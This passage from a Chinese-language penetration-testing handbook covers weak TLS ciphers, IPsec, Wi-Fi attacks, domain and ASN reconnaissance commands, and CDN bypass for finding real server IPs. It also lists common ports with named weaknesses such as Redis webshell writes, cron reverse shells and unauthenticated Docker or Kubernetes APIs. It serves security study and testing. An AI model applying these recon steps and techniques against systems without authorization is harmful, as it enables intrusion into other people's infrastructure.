<li>RSA 密钥传输 - 不支持前向安全性</li>
<li>CBC 模式密码 - 易受 BEAST 和 Lucky 13 攻击</li>
<li>RC4 流密码 - 在 HTTPS 中使用并不安全</li>
<li>SHA-1 哈希函数 - 建议以 SHA-2 取而代之</li>
<li>任意 Diffie-Hellman 组- CVE-2016-0701 漏洞</li>
<li>输出密码 - 易受 FREAK 和 LogJam 攻击</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="id9">
<h4>子协议<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<p>SSL/TLS协议有一个高度模块化的架构，分为很多子协议，主要是：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>Handshake 协议</dt>
<dd><ul class="first last">
<li>包括协商安全参数和密码套件、服务端身份认证(客户端身份认证可选)、密钥交换</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>ChangeCipherSpec 协议</dt>
<dd><ul class="first last">
<li>一条消息表明握手协议已经完成</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Alert 协议</dt>
<dd><ul class="first last">
<li>对握手协议中一些异常的错误提醒，分为fatal和warning两个级别，fatal类型的错误会直接中断SSL链接，而warning级别的错误SSL链接仍可继续，只是会给出错误警告</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Record 协议</dt>
<dd><ul class="first last">
<li>包括对消息的分段、压缩、消息认证和完整性保护、加密等</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id10">
<h4>参考链接<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<div class="section" id="rfc">
<h5>RFC<a class="headerlink" href="#rfc" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://tools.ietf.org/html/rfc2246">RFC 2246 The TLS Protocol Version 1.0</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc4346">RFC 4346 The Transport Layer Security (TLS) Protocol Version 1.1</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc5246">RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc6101">RFC 6101 The Secure Sockets Layer (SSL) Protocol Version 3.0</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc6176">RFC 6176 Prohibiting Secure Sockets Layer (SSL) Version 2.0</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc7568">RFC 7568 Deprecating Secure Sockets Layer Version 3.0</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc8446">RFC 8446 The Transport Layer Security (TLS) Protocol Version 1.3</a></li>
</ul>
</div>
<div class="section" id="document">
<h5>Document<a class="headerlink" href="#document" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://en.wikipedia.org/wiki/Transport_Layer_Security">Wikipedia Transport Layer Security</a></li>
</ul>
</div>
</div>
</div>
<span id="document-network/ipsec"></span><div class="section" id="ipsec">
<h3>IPsec<a class="headerlink" href="#ipsec" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>IPsec（IP Security）是IETF制定的三层隧道加密协议，它为Internet上传输的数据提供了高质量的、可互操作的、基于密码学的安全保证。特定的通信方之间在IP层通过加密与数据源认证等方式，提供了以下的安全服务：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>数据机密性（Confidentiality）</dt>
<dd><ul class="first last">
<li>IPsec发送方在通过网络传输包前对包进行加密。</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>数据完整性（Data Integrity）</dt>
<dd><ul class="first last">
<li>IPsec接收方对发送方发送来的包进行认证，以确保数据在传输过程中没有被篡改。</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>数据来源认证（Data Authentication）</dt>
<dd><ul class="first last">
<li>IPsec在接收端可以认证发送IPsec报文的发送端是否合法。</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>防重放（Anti-Replay）</dt>
<dd><ul class="first last">
<li>IPsec接收方可检测并拒绝接收过时或重复的报文。</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id2">
<h4>优点<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>IPsec具有以下优点：</p>
<ul class="simple">
<li>支持IKE（Internet Key Exchange，因特网密钥交换），可实现密钥的自动协商功能，减少了密钥协商的开销。可以通过IKE建立和维护SA的服务，简化了IPsec的使用和管理。</li>
<li>所有使用IP协议进行数据传输的应用系统和服务都可以使用IPsec，而不必对这些应用系统和服务本身做任何修改。</li>
<li>对数据的加密是以数据包为单位的，而不是以整个数据流为单位，这不仅灵活而且有助于进一步提高IP数据包的安全性，可以有效防范网络攻击。</li>
</ul>
</div>
<div class="section" id="id3">
<h4>构成<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>IPsec由四部分内容构成：</p>
<ul class="simple">
<li>负责密钥管理的Internet密钥交换协议IKE（Internet Key Exchange Protocol）</li>
<li>负责将安全服务与使用该服务的通信流相联系的安全关联SA（Security Associations）</li>
<li>直接操作数据包的认证头协议AH（IP Authentication Header）和安全载荷协议ESP（IP Encapsulating Security Payload）</li>
<li>若干用于加密和认证的算法</li>
</ul>
</div>
<div class="section" id="security-association-sa">
<h4>安全联盟（Security Association，SA）<a class="headerlink" href="#security-association-sa" title="永久链接至标题">¶</a></h4>
<p>IPsec在两个端点之间提供安全通信，端点被称为IPsec对等体。</p>
<p>SA是IPsec的基础，也是IPsec的本质。SA是通信对等体间对某些要素的约定，例如，使用哪种协议（AH、ESP还是两者结合使用）、协议的封装模式（传输模式和隧道模式）、加密算法（DES、3DES和AES）、特定流中保护数据的共享密钥以及密钥的生存周期等。建立SA的方式有手工配置和IKE自动协商两种。</p>
<p>SA是单向的，在两个对等体之间的双向通信，最少需要两个SA来分别对两个方向的数据流进行安全保护。同时，如果两个对等体希望同时使用AH和ESP来进行安全通信，则每个对等体都会针对每一种协议来构建一个独立的SA。</p>
<p>SA由一个三元组来唯一标识，这个三元组包括SPI（Security Parameter Index，安全参数索引）、目的IP地址、安全协议号（AH或ESP）。</p>
<p>SPI是用于唯一标识SA的一个32比特数值，它在AH和ESP头中传输。在手工配置SA时，需要手工指定SPI的取值。使用IKE协商产生SA时，SPI将随机生成。</p>
</div>
<div class="section" id="ike">
<h4>IKE<a class="headerlink" href="#ike" title="永久链接至标题">¶</a></h4>
<p>IKE（RFC2407，RFC2408、RFC2409）属于一种混合型协议，由Internet安全关联和密钥管理协议（ISAKMP）和两种密钥交换协议OAKLEY与SKEME组成。IKE创建在由ISAKMP定义的框架上，沿用了OAKLEY的密钥交换模式以及SKEME的共享和密钥更新技术，还定义了它自己的两种密钥交换方式。</p>
<p>IKE使用了两个阶段的ISAKMP：</p>
<p>第一阶段，协商创建一个通信信道（IKE SA），并对该信道进行验证，为双方进一步的IKE通信提供机密性、消息完整性以及消息源验证服务；
第二阶段，使用已建立的IKE SA建立IPsec SA（V2中叫Child SA）。</p>
</div>
</div>
<span id="document-network/wifi"></span><div class="section" id="wi-fi">
<h3>Wi-Fi<a class="headerlink" href="#wi-fi" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>Wi-Fi又称“无线热点”或“无线网络”，是Wi-Fi联盟的商标，一个基于IEEE 802.11标准的无线局域网技术。</p>
</div>
<div class="section" id="id2">
<h4>攻击<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>暴力破解<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>WiFi密码是基于预置的秘钥，可以通过抓取报文的方式在本地快速的批量进行密码爆破尝试。</p>
</div>
<div class="section" id="id4">
<h5>伪造热点<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>AP可以动态的广播自己，客户也可以主动发送探针请求。可以伪造AP发送对探针请求的响应包，来让客户端错误的识别。</p>
</div>
<div class="section" id="id5">
<h5>秘钥重装攻击<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>该漏洞由Vanhoef发现。Wi-Fi在握手时双方会更新秘钥，该攻击通过重放握手信息，令客户端重新安装相同的秘钥。</p>
</div>
<div class="section" id="dragonblood">
<h5>Dragonblood<a class="headerlink" href="#dragonblood" title="永久链接至标题">¶</a></h5>
<p>最新版的WPA3标准在实现上存在一些问题，同样由Vanhoef发现。包含拒绝服务攻击、降级攻击、侧信道泄露等。</p>
</div>
</div>
<div class="section" id="id6">
<h4>参考链接<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.wi-fi.org/">Wi-Fi Alliance</a></li>
<li><a class="reference external" href="https://papers.mathyvanhoef.com/dragonblood.pdf">Dragonblood</a> : Analyzing the Dragonfly Handshake of WPA3 and EAP-pwd</li>
<li><a class="reference external" href="https://papers.mathyvanhoef.com/nordsec2019.pdf">Improving Privacy through Fast Passive Wi-Fi Scanning</a></li>
<li><a class="reference external" href="https://papers.mathyvanhoef.com/asiaccs2019.pdf">Practical Side-Channel Attacks against WPA-TKIP</a></li>
<li><a class="reference external" href="https://papers.mathyvanhoef.com/blackhat-eu2017.pdf">Key Reinstallation Attacks: Breaking the WPA2 Protocol</a></li>
<li><a class="reference external" href="https://tools.ietf.org/html/rfc7664">RFC 7664 Dragonfly Key Exchange</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-info/index"></span><div class="section" id="id1">
<h2>信息收集<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-info/network"></span><div class="section" id="id1">
<h3>网络入口/信息<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<ul class="simple">
<li><dl class="first docutils">
<dt>网络拓扑信息</dt>
<dd><ul class="first last">
<li>外网出口</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>IP信息</dt>
<dd><ul class="first last">
<li>C段</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>线下网络</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>Wi-Fi</dt>
<dd><ul class="first last">
<li>SSID</li>
<li>认证信息</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>VPN</dt>
<dd><ul class="first last">
<li>厂商</li>
<li>登录方式</li>
</ul>
</dd>
</dl>
</li>
<li>邮件网关</li>
<li>手机APP</li>
<li>小程序后台</li>
<li>SSO</li>
<li>边界网络设备</li>
<li>上游运营商</li>
</ul>
</div>
<span id="document-info/domain"></span><div class="section" id="id1">
<h3>域名信息<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="whois">
<h4>Whois<a class="headerlink" href="#whois" title="永久链接至标题">¶</a></h4>
<p><a class="reference external" href="https://www.whois.com/">Whois</a> 可以查询域名是否被注册，以及注册域名的详细信息的数据库，其中可能会存在一些有用的信息，例如域名所有人、域名注册商、邮箱等。</p>
</div>
<div class="section" id="id3">
<h4>搜索引擎搜索<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>搜索引擎通常会记录域名信息，可以通过 <code class="docutils literal notranslate"><span class="pre">site:</span> <span class="pre">domain</span></code> 的语法来查询。</p>
</div>
<div class="section" id="id4">
<h4>第三方查询<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>网络中有相当多的第三方应用提供了子域的查询功能，下面有一些例子，更多的网站可以在 8.1 工具列表 中查找。</p>
<ul class="simple">
<li><a class="reference external" href="https://dnsdumpster.com/">DNSDumpster</a></li>
<li><a class="reference external" href="https://www.virustotal.com/">Virustotal</a></li>
<li>CrtSearch</li>
<li>threatminer</li>
<li>Censys</li>
</ul>
</div>
<div class="section" id="asn">
<h4>ASN信息关联<a class="headerlink" href="#asn" title="永久链接至标题">¶</a></h4>
<p>在网络中一个自治系统 (Autonomous System, AS) 是一个有权自主地决定在本系统中应采用何种路由协议的小型单位。这个网络单位可以是一个简单的网络也可以是一个由一个或多个普通的网络管理员来控制的网络群体，它是一个单独的可管理的网络单元 (例如一所大学，一个企业或者一个公司个体) 。</p>
<p>一个自治系统有时也被称为是一个路由选择域 (routing domain) 。一个自治系统将会分配一个全局的唯一的16位号码，这个号码被称为自治系统号 (ASN) 。因此可以通过ASN号来查找可能相关的IP，例如：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">whois</span> <span class="o">-</span><span class="n">h</span> <span class="n">whois</span><span class="o">.</span><span class="n">radb</span><span class="o">.</span><span class="n">net</span> <span class="o">--</span> <span class="s1">&#39;-i origin AS111111&#39;</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">Eo</span> <span class="s2">&quot;([0-9.]+)</span><span class="si">{4}</span><span class="s2">/[0-9]+&quot;</span> <span class="o">|</span> <span class="n">uniq</span>
<span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">targets</span><span class="o">-</span><span class="n">asn</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="n">targets</span><span class="o">-</span><span class="n">asn</span><span class="o">.</span><span class="n">asn</span><span class="o">=</span><span class="mi">15169</span>
</pre></div>
</div>
</div>
<div class="section" id="id5">
<h4>域名相关性<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<p>同一个企业/个人注册的多个域名通常具有一定的相关性，例如使用了同一个邮箱来注册、使用了同一个备案、同一个负责人来注册等，可以使用这种方式来查找关联的域名。一种操作步骤如下：</p>
<ul class="simple">
<li>查询域名注册邮箱</li>
<li>通过域名查询备案号</li>
<li>通过备案号查询域名</li>
<li>反查注册邮箱</li>
<li>反查注册人</li>
<li>通过注册人查询到的域名在查询邮箱</li>
<li>通过上一步邮箱去查询域名</li>
<li>查询以上获取出的域名的子域名</li>
</ul>
</div>
<div class="section" id="id6">
<h4>网站信息利用<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<p>网站中有相当多的信息，网站本身、各项安全策略、设置等都可能暴露出一些信息。</p>
<p>网站本身的交互通常不囿于单个域名，会和其他子域交互。对于这种情况，可以通过爬取网站，收集站点中的其他子域信息。这些信息通常出现在JavaScript文件、资源文件链接等位置。</p>
<p>网站的安全策略如跨域策略、CSP规则等通常也包含相关域名的信息。有时候多个域名为了方便会使用同一个SSL/TLS证书，因此有时可通过证书来获取相关域名信息。</p>
</div>
<div class="section" id="https">
<h4>HTTPS证书<a class="headerlink" href="#https" title="永久链接至标题">¶</a></h4>
<div class="section" id="id7">
<h5>证书透明度<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>为了保证HTTPS证书不会被误发或伪造，CA会将证书记录到可公开验证、不可篡改且只能附加内容的日志中，任何感兴趣的相关方都可以查看由授权中心签发的所有证书。因此可以通过查询已授权证书的方式来获得相关域名。</p>
</div>
<div class="section" id="san">
<h5>SAN<a class="headerlink" href="#san" title="永久链接至标题">¶</a></h5>
<p>主题备用名称 (Subject Alternate Name, SAN)，简单来说，在需要多个域名，并将其用于各项服务时，多使用SAN证书。SAN允许在安全证书中使用subjectAltName字段将多种值与证书关联，这些值被称为主题备用名称。</p>
</div>
</div>
<div class="section" id="id8">
<h4>域传送漏洞<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<p>DNS域传送 (zone transfer) 指的是冗余备份服务器使用来自主服务器的数据刷新自己的域 (zone) 数据库。这是为了防止主服务器因意外不可用时影响到整个域名的解析。</p>
<p>一般来说，域传送操作应该只允许可信的备用DNS服务器发起，但是如果错误配置了授权，那么任意用户都可以获得整个DNS服务器的域名信息。这种错误授权被称作是DNS域传送漏洞。</p>
</div>
<div class="section" id="passive-dns">
<h4>Passive DNS<a class="headerlink" href="#passive-dns" title="永久链接至标题">¶</a></h4>
<p>Passive DNS被动的从递归域名服务器记录来自不同域名服务器的响应，形成数据库。利用Passive DNS数据库可以知道域名曾绑定过哪些IP，IP曾关联到哪些域名，域名最早/最近出现的时间，为测试提供较大的帮助。Virustotal、passivetotal、CIRCL等网站都提供了Passive DNS数据库的查询。</p>
</div>
<div class="section" id="id9">
<h4>泛解析<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<p>泛解析是把 <cite>*.example.com</cite> 的所有A记录都解析到某个IP 地址上，在子域名枚举时需要处理这种情况以防生成大量无效的记录。</p>
</div>
<div class="section" id="id10">
<h4>重要记录<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<div class="section" id="cname">
<h5>CNAME<a class="headerlink" href="#cname" title="永久链接至标题">¶</a></h5>
<p>CNAME即Canonical name，又称alias，将域名指向另一个域名。其中可能包含其他关联业务的信息。很多网站使用的CDN加速功能利用了该记录。</p>
</div>
<div class="section" id="mx">
<h5>MX记录<a class="headerlink" href="#mx" title="永久链接至标题">¶</a></h5>
<p>MX记录即Mail Exchanger，记录了发送电子邮件时域名对应的服务器地址。可以用来寻找SMTP服务器信息。</p>
</div>
<div class="section" id="ns">
<h5>NS记录<a class="headerlink" href="#ns" title="永久链接至标题">¶</a></h5>
<p>NS (Name Server) 记录是域名服务器的记录，用来指定域名由哪个DNS服务器来进行解析。</p>
</div>
<div class="section" id="spf">
<h5>SPF记录<a class="headerlink" href="#spf" title="永久链接至标题">¶</a></h5>
<p>SPF (Sender Policy Framework) 是为了防止垃圾邮件而提出来的一种DNS记录类型，是一种TXT类型的记录，用于登记某个域名拥有的用来外发邮件的所有IP地址。通过SPF记录可以获取相关的IP信息，常用命令为 <code class="docutils literal notranslate"><span class="pre">dig</span> <span class="pre">example.com</span> <span class="pre">txt</span></code> 。</p>
</div>
</div>
<div class="section" id="cdn">
<h4>CDN<a class="headerlink" href="#cdn" title="永久链接至标题">¶</a></h4>
<div class="section" id="id11">
<h5>CDN验证<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<p>可通过多地ping的方式确定目标是否使用了CDN，常用的网站有 <code class="docutils literal notranslate"><span class="pre">http://ping.chinaz.com/</span></code> <code class="docutils literal notranslate"><span class="pre">https://asm.ca.com/en/ping.php</span></code> 等。</p>
</div>
<div class="section" id="id12">
<h5>域名查找<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<p>使用了CDN的域名的父域或者子域名不一定使用了CDN，可以通过这种方式去查找对应的IP。</p>
</div>
<div class="section" id="id13">
<h5>历史记录查找<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h5>
<p>CDN可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实IP。</p>
</div>
<div class="section" id="id14">
<h5>邮件信息<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<p>通过社会工程学的方式进行邮件沟通，从邮件头中获取IP地址，IP地址可能是网站的真实IP或者是目标的出口IP。</p>
</div>
</div>
<div class="section" id="id15">
<h4>子域爆破<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h4>
<p>在内网等不易用到以上技巧的环境，或者想监测新域名上线时，可以通过批量尝试的方式，找到有效的域名。</p>
</div>
<div class="section" id="id16">
<h4>缓存探测技术<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h4>
<p>在企业网络中通常都会配置DNS服务器为网络内的主机提供域名解析服务。域名缓存侦测（DNS Cache Snooping）技术就是向这些服务器发送域名解析请求，但并不要求使用递归模式，用于探测是否请求过某个域名。这种方式可以用来探测是否使用了某些软件，尤其是安全软件。</p>
</div>
</div>
<span id="document-info/port"></span><div class="section" id="id1">
<h3>端口信息<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>常见端口及其脆弱点<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>FTP (21/TCP)</dt>
<dd><ul class="first last">
<li>默认用户名密码 <code class="docutils literal notranslate"><span class="pre">anonymous:anonymous</span></code></li>
<li>暴力破解密码</li>
<li>VSFTP某版本后门</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>SSH (22/TCP)</dt>
<dd><ul class="first last">
<li>部分版本SSH存在漏洞可枚举用户名</li>
<li>暴力破解密码</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Telent (23/TCP)</dt>
<dd><ul class="first last">
<li>暴力破解密码</li>
<li>嗅探抓取明文密码</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>SMTP (25/TCP)</dt>
<dd><ul class="first last">
<li>无认证时可伪造发件人</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>DNS (53/UDP)</dt>
<dd><ul class="first last">
<li>域传送漏洞</li>
<li>DNS劫持</li>
<li>DNS缓存投毒</li>
<li>DNS欺骗</li>
<li>SPF / DMARC Check</li>
<li><dl class="first docutils">
<dt>DDoS</dt>
<dd><ul class="first last">
<li>DNS Query Flood</li>
<li>DNS 反弹</li>
</ul>
</dd>
</dl>
</li>
<li>DNS 隧道</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>DHCP 67/68</dt>
<dd><ul class="first last">
<li>劫持/欺骗</li>
</ul>
</dd>
</dl>
</li>
<li>TFTP (69/TCP)</li>
<li>HTTP (80/TCP)</li>
<li><dl class="first docutils">
<dt>Kerberos (88/TCP)</dt>
<dd><ul class="first last">
<li>主要用于监听KDC的票据请求</li>
<li>用于进行黄金票据和白银票据的伪造</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>POP3 (110/TCP)</dt>
<dd><ul class="first last">
<li>爆破</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>RPC (135/TCP)</dt>
<dd><ul class="first last">
<li>wmic 服务利用</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>NetBIOS (137/UDP &amp; 138/UDP)</dt>
<dd><ul class="first last">
<li>未授权访问</li>
<li>弱口令</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>NetBIOS / Samba (139/TCP)</dt>
<dd><ul class="first last">
<li>未授权访问</li>
<li>弱口令</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>SNMP (161/TCP)</dt>
<dd><ul class="first last">
<li>Public 弱口令</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>LDAP (389/TCP)</dt>
<dd><ul class="first last">
<li>用于域上的权限验证服务</li>
<li>匿名访问</li>
<li>注入</li>
</ul>
</dd>
</dl>
</li>
<li>HTTPS (443/TCP)</li>
<li><dl class="first docutils">
<dt>SMB (445/TCP)</dt>
<dd><ul class="first last">
<li>Windows 协议簇，主要功能为文件共享服务</li>
<li><code class="docutils literal notranslate"><span class="pre">net</span> <span class="pre">use</span> <span class="pre">\\192.168.1.1</span> <span class="pre">/user:xxx\username</span> <span class="pre">password</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Linux Rexec (512/TCP &amp; 513/TCP &amp; 514/TCP)</dt>
<dd><ul class="first last">
<li>弱口令</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Rsync (873/TCP)</dt>
<dd><ul class="first last">
<li>未授权访问</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>RPC (1025/TCP)</dt>
<dd><ul class="first last">
<li>NFS匿名访问</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Java RMI (1090/TCP &amp; 1099/TCP)</dt>
<dd><ul class="first last">
<li>反序列化远程命令执行漏洞</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>MSSQL (1433/TCP)</dt>
<dd><ul class="first last">
<li>弱密码</li>
<li>差异备份 GetShell</li>
<li>SA 提权</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Oracle (1521/TCP)</dt>
<dd><ul class="first last">
<li>弱密码</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>NFS (2049/TCP)</dt>
<dd><ul class="first last">
<li>权限设置不当</li>
<li><code class="docutils literal notranslate"><span class="pre">showmount</span> <span class="pre">&lt;host&gt;</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>ZooKeeper (2171/TCP &amp; 2375/TCP)</dt>
<dd><ul class="first last">
<li>无身份认证</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Docker Remote API (2375/TCP)</dt>
<dd><ul class="first last">
<li>未限制IP / 未启用TLS身份认证</li>
<li><code class="docutils literal notranslate"><span class="pre">http://docker.addr:2375/version</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>MySQL (3306/TCP)</dt>
<dd><ul class="first last">
<li>弱密码</li>
<li>日志写WebShell</li>
<li>UDF提权</li>
<li>MOF提权</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>RDP / Terminal Services (3389/TCP)</dt>
<dd><ul class="first last">
<li>弱密码</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Postgres (5432/TCP)</dt>
<dd><ul class="first last">
<li>弱密码</li>
<li>执行系统命令</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>VNC (5900/TCP)</dt>
<dd><ul class="first last">
<li>弱密码</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CouchDB (5984/TCP)</dt>
<dd><ul class="first last">
<li>未授权访问</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>WinRM (5985/TCP)</dt>
<dd><ul class="first last">
<li>Windows对WS-Management的实现</li>
<li>在Vista上需要手动启动，在Windows Server 2008中服务是默认开启的</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Redis (6379/TCP)</dt>
<dd><ul class="first last">
<li>无密码或弱密码</li>
<li>绝对路径写 WebShell</li>
<li>计划任务反弹 Shell</li>
<li>写 SSH 公钥</li>
<li>主从复制 RCE</li>
<li>Windows 写启动项</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Kubernetes API Server (6443/TCP &amp;&amp; 10250/TCP)</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">https://Kubernetes:10250/pods</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>JDWP (8000/TCP)</dt>
<dd><ul class="first last">
<li>远程命令执行</li>
</ul>
</dd>
</dl>
</li>
<li>ActiveMQ (8061/TCP)</li>
<li><dl class="first docutils">
<dt>Jenkin (8080/TCP)</dt>
<dd><ul class="first last">
<li>未授权访问</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Elasticsearch (9200/TCP)</dt>
<dd><ul class="first last">
<li>代码执行</li>
<li><code class="docutils literal notranslate"><span class="pre">http://es.addr:9200/_plugin/head/</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">http://es.addr:9200/_nodes</span></code></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Memcached (11211/TCP)</dt>
<dd><ul class="first last">
<li>未授权访问</li>
</ul>
</dd>
</dl>
</li>
<li>RabbitMQ (15672/TCP &amp; 15692/TCP &amp; 25672/TCP)</li>
<li><dl class="first docutils">
<dt>MongoDB (27017/TCP)</dt>
<dd><ul class="first last">
<li>无密码或弱密码</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Hadoop (50070/TCP &amp; 50075/TCP)</dt>
<dd><ul class="first last">
<li>未授权访问</li>
</ul>
</dd>
</dl>
</li>
</ul>
<p>除了以上列出的可能出现的问题，暴露在公网上的服务若不是最新版，都可能存在已经公开的漏洞</p>
</div>
<div class="section" id="id3">
<h4>常见端口扫描技术<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="id4">
<h5>全扫描<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>扫描主机尝试使用三次握手与目标主机的某个端口建立正规的连接，若成功建立连接，则端口处于开放状态，反之处于关闭状态。</p>
<p>全扫描实现简单，且以较低的权限就可以进行该操作。但是在流量日志中会有大量明显的记录。</p>
</div>
<div class="section" id="id5">
<h5>半扫描<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>在半扫描中，仅发送SYN数据段，如果应答为RST，则端口处于关闭状态，若应答为SYN/ACK，则端口处于监听状态。不过这种方式需要较高的权限，而且部分防火墙已经开始对这种扫描方式做处理。</p>
</div>
<div class="section" id="fin">
<h5>FIN扫描<a class="headerlink" href="#fin" title="永久链接至标题">¶</a></h5>
<p>FIN扫描是向目标发送一个FIN数据包，如果是开放的端口，会返回RST数据包，关闭的端口则不会返回数据包，可以通过这种方式来判断端口是否打开。</p>
<p>这种方式并不在TCP三次握手的状态中，所以不会被记录，相对SYN扫描要更隐蔽一些。</p>
</div>
</div>
<div class="section" id="web">
<h4>Web服务<a class="headerlink" href="#web" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>Jenkins</dt>
<dd><ul class="first last">
<li>未授权访问</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Gitlab</dt>
<dd><ul class="first last">
<li>对应版本CVE</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>Zabbix</dt>
<dd><ul class="first last">
<li>权限设置不当</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id6">
